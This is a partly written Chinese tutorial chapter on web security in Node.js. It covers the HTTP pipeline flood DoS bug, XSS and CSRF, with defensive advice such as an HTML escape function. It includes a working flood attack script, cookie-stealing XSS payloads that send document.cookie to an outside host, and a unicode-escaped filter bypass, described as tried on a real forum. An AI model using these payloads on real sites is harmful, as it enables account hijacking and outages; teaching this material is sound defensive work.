#web安全实战
##前言
本章主要介绍用Node.js开发web应用可能面临的安全问题，读者通过阅读本章可以知晓web安全的基本概念，并且通过各种防御措施抵御一些常规的恶意攻击，为自己建立一个较为安全的web站点。

读者希望顺利阅读本章，需要对`http协议`、数据库、`Javascript`有所了解。

##什么是web安全
在互联网时代，数据安全与个人隐私受到了前所未有的挑战。

###安全的定义
虽然我们并不喜欢强调一些概念，但是对于web安全的定义还是有必要了解一下：

>web安全和信息安全一样，主要分为两方面：（1）服务安全，确保网络设备的安全运行，提供有效的网络服务。（2）数据安全，确保在网上传输数据的保密性、完整性和可用性等。

比如我们之后要介绍的`Sql注入`，`XSS`攻击等都是属于数据安全的范畴，`Dos`，`Slowlori`攻击等都属于服务安全范畴。

###安全的意识
我们在编写代码，设计架构的时候更应该有安全的意识，时刻保持清醒的头脑，可能我们的web站点100处都布防的很好，只有一个点疏忽了，攻击者就可能利用这个点进行突破，而我们另外100处的努力也白费了。

##Node.js中的web安全
Node.js作为一门新型的开发语言，很多开发者都会用它来进行快速搭建web站点，期间随着版本号的更替也修复了不少漏洞。不过Node.js提供的网络接口其实较PHP更为底层，同时没有如`apache`、`nginx`等web服务器的保护，Node.js其实应该更加关注安全方面的问题。

###Http管道洪水漏洞
在Node.js版本`0.8.26`和`0.10.21`之前，都存在一个管道洪水的拒绝服务漏洞（`pipeline flood DoS`）。官网在发布这个漏洞修复代码之后，强烈建议在生产环境使用的Node.js版本立即升级到`0.8.26`和`0.10.21`，因为这个漏洞威力巨大，攻击者可以很轻易的击溃一个正常运行的Node.js的http服务器。

这个漏洞的原理也非常简单，主要是客户端不接受服务端的响应，而拼命的发送请求，造成Node.js的`Stream流`无法泄洪，主机内存耗尽而崩溃，官网给出的解释如下：

>当在一个连接上的客户端有很多`http`请求管道，并且客户端并有读取Node.js服务器响应的数据，Node.js的服务将可能被击溃。强烈建议任何在生产环境下的版本是`0.8`或`0.10`的http服务器都尽快升级。新版本这样修复了问题，当服务端在等待`stream`流的`drain`事件时，`socket`和`http解析`将会停止。在攻击脚本中，`socket`最终会超时，并被服务端关闭连接。如果客户端并不是恶意攻击，只是发送大量的请求，但是响应非常缓慢，那么响应的吞吐率也会相应的减少。

现在让我们看一下这个漏洞的造成的杀伤力吧，我们在一台4cpu，4G内存的服务器上启动一个Node.js的http服务，响应`1kb`的字符`h`，Node.js版本为`0.10.7`。

    var http = require('http');
    var buf = new Buffer(1024*1024);//1kb buffer
    buf.fill('h');
    http.createServer(function (request, response) {
        response.writeHead(200, {'Content-Type': 'text/plain'});
        response.end(buf);
    }).listen(8124);
    console.log(process.memoryUsage());
    setInterval(function(){//per minute memory usage
    	console.log(process.memoryUsage());
    },1000*60)

上述代码我们启动了一个Node.js服务器，监听`8124`端口，响应`1kb`的字符`h`，同时每分钟打印Node.js内存使用情况。
	
在另外一台同样配置的服务器上启动如下攻击脚本：

    var net = require('net');
    var attack_str = 'GET / HTTP/1.1\r\nHost: 192.168.28.4\r\n\r\n'
    var i = 1000000;//10W次的发送
    var client = net.connect({port: 8124, host:'192.168.28.4'},
    	function() { //'connect' listener
    		while(i--){
    		  client.write(attack_str);
    		  }
    	});
    client.on('error', function(e) {
    	console.log('attack success');
    });

下面是在攻击脚本启动10分钟后，web服务器打印的内存使用情况：

    { rss: 10190848, heapTotal: 6147328, heapUsed: 2632432 }
    { rss: 921882624, heapTotal: 888726688, heapUsed: 860301136 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189239056 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189251728 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189263768 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189270888 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189278008 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189285096 }
    { rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189292216 }
    { rss: 1250893824, heapTotal: 1211065584, heapUsed: 1189301864 }

下面是使用`top`命令，返回的系统内存使用情况：

    Mem:   3925040k total,  3290428k used,   634612k free,   170324k buffers
	
可以看到，我们的攻击脚本只用了一个`socket`连接就消耗了大量Node.js服务器的内存，攻击脚本执行之后Node.js服务内存占用比之前多达200倍，如果有2-3个恶意攻击`socket`连接，Node.js服务器物理内存必然用完，然后开始频繁的交换从而失去响应或者进程奔溃。
	
##Sql注入
从1998年12月`Sql注入`首次进入人们的视线至今，`Sql注入`已经有10几个年头了，虽然我们已经有了很全面的防范`Sql注入`的对策，但是它的威力还是不容小觑。

###注入技巧

###防范措施

##NoSql注入
对于流行的非关系型数据库，是不是`Sql注入`就不适用了呢？答案是否定的，只要我们稍不注意，非关系型数据库还是会成为攻击者下手的对象。

###Mongodb注入实例

###防范措施

##XSS脚本攻击
`XSS`是什么？它的全名是：`Cross-site scripting`，为了和`CSS层叠样式表`区分所以取名`XSS`。是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了`HTML`以及用户端脚本语言。

###名称苏州网站注入
`XSS注入`常见的重灾区是社交网站和论坛，越是让用户自由输入内容的地方，我们就越要关注其能否抵御`XSS注入`。`XSS注入`的攻击原理很简单，构造一些非法的`url地址`或`js脚本`，一般引诱用户点击才触发的漏洞我们称为`反射性漏洞`，用户打开页面就就触发的称为`注入型漏洞`，当然`注入型漏洞`的危害要大一些。下面先用一个简单的实例来说明`XSS注入`无处不在。

名城苏州（www.2500sz.com)，是苏州本地门户网站，日均的`pv数`也达到了150万，它的论坛用户数也很多，是本地化新闻，社区论坛做的比较成功一个网站。

我们先注册成一个`2500sz.com`站点会员，进入论坛板块，开始发布新帖。打开发帖页面，在`web编辑器`中输入如下内容：

![2500 xss 1](http://farm6.staticflickr.com/5486/11044713706_d9c2eb6f05_o.jpg)

上面的代码就是输入一个网络分享的图片，我们在图片的`src`中直接写入了`javascript:alert('xss');`，操作成功后生成帖子，用`IE6、7`的用户打开这个我发的这个帖子就会出现下图的`alert('xss')`弹窗。 

![2500 xss 2](http://farm8.staticflickr.com/7321/11044713636_440168b8b7_o.jpg)

当然我会将标题设计的非常吸引人点击，比如“陈冠希艳照又有流出2012版(20P-步兵)” ，这样如果我将里面的`alert`换成恶意代码，如下：

    location.href='http://www.xss.com?cookie='+document.cookie；
	
用户的`cookie`我们到手了，如果服务端`session`设置过期很长的话，我以后甚至拿这个`cookie`而不需用户名密码，就可以以这个用户的身份登录成功了，关于`session`和`cookie`的关系我们在下一节中将会详细讲到。这里的`location.href`只是处于简单，如果做了跳转这个帖子很快会被管理员删除，但是如果我写如下代码，并且帖子的内容也是比较真实的，说不定这个帖子就会祸害很多人：

    var img = document.createElement('img');
    img.src='http://www.xss.com?cookie='+document.cookie;
    img.style.display='none';
    document.getElementsByTagName('body')[0].appendChild(img);

这样就神不知鬼不觉的把当前用户的`cookie`发送给了我的恶意站点，我的恶意站点通过获取`get参数`就拿到了用户的`cookie`，我们可以通过这个方法拿到用户各种各样的数据。

###ajax的XSS注入
另外一个地方容易造成`XSS注入`的是`ajax`的`json`不正确使用。

比如有这样的一个场景，是一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，项目经理要求先显示博文的内容，然后通过`ajax`去获取留言的第一页内容，通过`ajax`分页点击下一页获取第二页的留言。

这么做的好处有：

（1）加快了博文详细页的加载，因为留言信息往往有用户头像，昵称，id等等，需要多表查询而且一般用户会先看博文，再拉下去看留言，这时留言已经加载完毕了。

（2）`ajax`的留言分页能够更加快速的响应，用户不必让博文重新刷新一边，而是直接查看更多的留言。

于是我们的前端工程师从PHP那获取了`json`数据之后，将数据放入`DOM`文档中，大家能看出下面代码的问题吗？

    var commentObj = $('#comment');
    $.get('/getcomment', {r:Math.random(),page:1,article_id:1234},function(data){
        if(data.state !== 200)  return commentObj.html('留言加载失败。')
        commentObj.html(data.content);
    },'json');

我们的设计初衷是，后端将留言内容套入模板，存入`json`格式，然后输出这段模板中的代码，`json`返回示例如下：
    
	{"state":200, "content":"模板的字符串片段"}

如果没有看出问题，我们尝试执行下面的代码，大家可以打开`firebug`或者`chrome`的`开发人员工具`，直接把下面代码粘贴到有`JQuery`插件的网站中运行：

    $('div:first').html('<script>alert("xss")</script>');
	
正常弹出了`alert`框，你可能觉得这比较小儿科，我们PHP程序员已经转义了尖括号<>还有单双引号了"'，所以上面的那串恶意代码会漂亮的变成如下字符打印到留言内容中:

    $('div:first').html('&lt;script&gt; alert(&quot;xss&quot;)&lt;/script&gt; ');
	
这里需要表扬一下我们的PHP程序员，可以将常规的一些`XSS`注入都屏蔽掉了，但是在`utf-8`编码中，字符还有一种表示方式，那就是`unicode码`，我们把上面的恶意字符串改写成如下：

    $('div:first').html('\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e');

大家发现还是输出了`alert`，注入又成功了，只是这次需要将写好的恶意代码放入转码器中做下转义，当年的`webqq`曾经就报过上面这种`unicode码`的`XSS`注入漏洞，另外有很多反射型`XSS`注入点因为过滤了单双引号，所以必须使用这种方式进行注入了。
	
###常用注入方式
更多`XSS`注入方式参阅：(XSS Filter Evasion Cheat Sheet)[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]

###防范措施
对于防范`XSS`注入，其实只有两个字`过滤`，一定要对用户提交上来的数据保持怀疑，过滤调其中可能注入的字符，这样才能保证应用的安全，另外对于是入库时过滤还是读库时过滤，这就需要根据应用的类型来进行选择了。下面是一个简单的过滤函数代码：

    var escape = function(html){
      return String(html)
        .replace(/&(?!\w+;)/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    };

不过上述的过滤方法会把所有`HTML`等标签都转义，如果我们的网站应用确实有自定义HMTL标签的需求的话，`escape`函数就力不从心了，这里我推荐一个过滤`XSS`注入的模块，由本书另一位作者`老雷`提供：

[js-xss](https://github.com/leizongmin/js-xss)

##CSRF请求伪造
`CSRF`是什么呢？`CSRF`全名是`Cross-site request forgery`，是一种对网站的恶意利用，`CSRF`比`XSS`更具危险性。

###Session详解
想要深入理解`CSRF`的攻击特性我们必须了解网站`session`的工作原理。

`session`我想大家都不陌生，无论你用Node.js或PHP开发过网站的都肯定用过`session`对象，假如我把浏览器的`cookie`禁用了，大家认为`session`还能正常工作吗？

答案是否定的，我在这边举个简单的例子帮助大家理解`session`。

比如我办了一张超市的会员卡，超市给了我一张带有卡号的会员卡。我能享受哪些权利（比如会员有部分商品打折）以及我的个人资料都是保存在超市会员的数据库里的。我每次去超市购物结账，超市就知道我是谁了，并且给我购买的商品打折优惠。

这里我们的会员卡卡号就相当于保存在`cookie`中的`sessionid`，而我的个人信息就是保存在服务端的`session`对象了，因为`cookie`它有两个重要特性，（1）同源性，保证了`cookie`不会跨域发送造成泄密；（2）附带性，保证每次请求服务端都会在请求头中带上`cookie`信息。也就是这两个特性为我们识别用户带来的便利，因为`HTTP`协议是无状态的，我们之所以知道请求用户是谁就是获取了用户请求头中的`cookie`信息做到的。

当然`session`对象的保存方法多种多样，可以保存在文件中，也可以内存里，考虑到分布式的横向扩展我们还是建议生产环境把它保存在第三方媒介中，比如`redis`或者`mongodb`，默认的`express`框架是将`session`对象保存在内存中的。

除了用cookie保存sessionid，我们还可以使用url参数来保存sessionid，只不过每次请求都需要在url里带上这个参数，另外近阶段利用`Etag`来保存`sessionid`也被使用在用户行为跟踪上。

相关`etag session`资料：[etag session](https://github.com/DoubleSpout/etagSession)

###CSRF的危害性
我们理解了`session`的工作机制后，`CSRF`也就很容易理解了。`CSRF`攻击就相当于恶意用户复制了我的会员卡，用我的会员卡享受购物的优惠折扣，更可以刷我购物卡里的余额购买他的东西！

`CSRF`的危害性我相信大家已经不言而喻了，我可以伪造某一个用户的身份给其好友发送垃圾信息，这些垃圾信息的超链接可能带有木马程序或者一些诈骗信息（比如借钱之类的），如果`CSRF`发送的垃圾信息还带有蠕虫链接的话，那些接收到这些有害信息的好友万一打开私信中的连接就也成为了有害信息的散播着，这样数以万计的用户被窃取了资料种植了木马。整个网站的应用就可能在瞬间奔溃，用户投诉，用户流失，公司声誉一落千丈甚至面临倒闭。曾经在MSN上，一个美国的19岁的小伙子Samy利用`css`的`background`漏洞几小时内让100多万用户成功的感染了他的蠕虫，虽然这个蠕虫并没有破坏整个应用，只是在每一个用户的签名后面都增加了一句“Samy 是我的偶像”，但是一旦这些漏洞被恶意用户利用，后果将不堪设想，同样的事情也曾经发生在新浪微博上面。想要`CSRF`攻击成功，最简单的方式就是配合`XSS`注入，所以千万不要小看了`XSS`注入攻击带来的后果，不是`alert`一个对话框那么简单，`XSS`注入仅仅是第一步！

###Cnodejs官网攻击实例



###防范措施

##应用层Dos拒绝服务

###应用层和网络层的Dos

###超大Buffer

###Slowlori攻击

###Post攻击

###Https业务接口

##文件路径攻击

###上传文件漏洞

###浏览文件漏洞

##加密攻击

###Md5存储密码

###随机数漏洞